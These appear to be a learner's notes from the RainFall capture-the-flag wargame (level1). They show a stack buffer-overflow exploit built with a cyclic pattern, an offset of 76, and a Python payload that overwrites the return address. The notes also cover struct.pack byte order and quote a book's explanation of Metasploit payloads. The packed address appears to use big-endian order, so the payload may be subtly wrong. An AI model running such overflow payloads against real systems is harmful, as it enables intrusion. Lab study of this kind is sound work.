
level1@RainFall:~$ ./level1 <<< $(python -c 'print("a" * 76)')
Illegal instruction (core dumped)




./pattern create 200
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag

./pattern offset 0x63413563 200
76


Buffer overflow pattern generator

python -c 'import struct; print("-" * 76 + struct.pack(">L",0x44840408))' > /tmp/payload

cat /tmp/payload -  | ./level1


struct = Interpret bytes as packed binary data
struct.pack takes non-byte values (e.g. integers, strings, etc.) and converts them to bytes.
Format Strings
< little-endian
> big-endian



Payloads
To understand what a payload does, let's consider a real-world example. A military unit of a certain country develops a new missile that can travel a range of 500 km at very high speed. Now, the missile body itself is of no use unless it's filled with the right kind of ammunition. Now, the military unit decided to load high explosive material within the missile so that when the missile hits the target, the explosive material within the missile explodes and causes the required damage to the enemy. So, in this case, the high explosive material within the missile is the payload. The payload can be changed based on the severity of damage that is to be caused after the missile is fired.
Similarly, payloads in the Metasploit Framework let us decide what action is to be performed on the target system once the exploit is successful. 

- Sagar Rahalkar, Nipun Jaswal - Metasploit Revealed _ Secrets of the Expert Pentester -  Build your Defense against Complex Attacks-Packt Publishing (2017)